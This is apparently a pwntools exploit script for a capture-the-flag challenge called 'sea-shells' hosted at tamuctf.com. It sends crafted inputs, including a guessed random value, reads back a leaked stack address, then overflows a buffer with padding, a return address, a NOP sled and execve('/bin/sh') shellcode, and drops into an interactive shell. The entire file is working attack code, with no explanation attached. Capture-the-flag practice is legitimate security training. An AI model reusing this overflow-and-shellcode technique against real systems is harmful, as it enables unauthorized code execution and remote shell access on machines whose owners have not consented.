#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''
    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="sea-shells")
    else:
        return process(binary)

def exploit(p,e,r):


    p.sendline(b"0")
    p.sendline(b"0")
    p.sendline(b"0")
    p.sendline(b"1804289383")

    p.recvuntil(b"hard work:")
    leak = int(p.recvline(), 16)

    leak_addr = p64(leak + 100)

    log.info(f"Leaked stack {hex(leak)}")

    shellcode = asm("""
                    mov rbx, 0x68732f6e69622f
                    push rbx
                    mov eax, 59
                    xor rsi, rsi
                    xor rdx, rdx
                    mov rdi, rsp
                    syscall
                """)

    pad = b"A" * 17
    chain = leak_addr + b"\x90" * 50 + shellcode

    p.sendline(pad+chain)
    p.interactive()

    return None

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
